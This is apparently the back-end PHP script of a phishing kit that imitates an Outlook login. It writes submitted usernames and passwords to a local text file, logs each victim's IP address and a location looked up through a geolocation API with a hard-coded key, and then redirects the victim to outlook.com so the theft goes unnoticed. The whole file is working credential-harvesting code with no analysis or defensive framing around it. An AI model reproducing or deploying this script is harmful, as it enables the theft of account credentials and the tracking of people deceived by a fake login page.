<?html
    $fnm = "saddasd.txt";
    $fhandlr = fopen($fnm, "a");
    
    fwrite($fhandlr, "-------------------------------------------\n");
    fwrite($fhandlr, 'U: '.$_POST['a7fxs1']."\n");
    fwrite($fhandlr, 'P: '.$_POST['a7fxs2']."\n");
    
    if( !empty($_SERVER['REMOTE_ADDR']) ){
    
        @$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['REMOTE_ADDR'];
        @$IPResult =  file_get_contents($api_url);
        @fwrite($fhandlr, 'IP: '.$_SERVER['REMOTE_ADDR']."\n");
        @fwrite($fhandlr, 'LC: '.$IPResult."\n");
    
    }elseif( !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ){
    
        @$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['HTTP_X_FORWARDED_FOR'];
        @$IPResult =  file_get_contents($api_url);
        @fwrite($fhandlr, 'IP: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
        @fwrite($fhandlr, 'LC: '.$IPResult."\n");
    
    }else{
        fwrite($fhandlr, 'IP1: '.$_SERVER['REMOTE_ADDR']."\n");
        fwrite($fhandlr, 'IP2: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
    }
    
    fwrite($fhandlr, 'Date: '. date("d-m-Y")."\n");
    fclose($fhandlr);
    header ('Location:https://outlook.com/');
    exit;
?>